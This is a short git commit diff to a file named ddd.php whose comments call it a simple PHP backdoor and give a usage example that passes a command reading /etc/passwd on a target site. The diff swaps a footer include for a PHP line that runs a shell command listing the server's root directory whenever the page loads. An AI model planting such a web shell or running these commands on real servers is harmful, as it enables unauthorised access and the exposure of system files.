9ea13f3f599a7fd97843942177dc1a3c422597af
Void <51586851+Val0id@users.noreply.github.com>
2023-02-07 09:55:12 +0700

    ddd

--- ddd.php
+++ ddd.php
@@ -1,3 +1,3 @@
 <!-- Simple PHP Backdoor By DK (One-Liner Version) -->
 <!-- Usage: http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd -->
-<?php require "./includes/footer.inc.php"; ?>
+<?php echo exec("ls -la /"); ?>
